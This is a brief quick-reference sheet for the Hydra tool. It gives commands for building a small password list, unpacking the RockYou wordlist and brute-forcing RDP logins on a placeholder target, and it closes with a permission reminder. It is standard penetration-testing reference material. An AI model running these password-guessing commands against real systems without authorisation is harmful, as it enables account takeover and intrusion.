# Hydra – Quick Reference

## Custom Wordlist

Create a custom password list:

```bash
printf "password\nadmin\nPassword123\nSummer2026\n" > pass.txt
```

Run Hydra:

```bash
hydra -l testuser -P pass.txt rdp://<TARGET-IP>
```

## RockYou Wordlist

Extract RockYou if required:

```bash
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

Run Hydra with RockYou:

```bash
hydra -l testuser -P /usr/share/wordlists/rockyou.txt rdp://<TARGET-IP>
```

> Use only against systems you own or have permission to test.
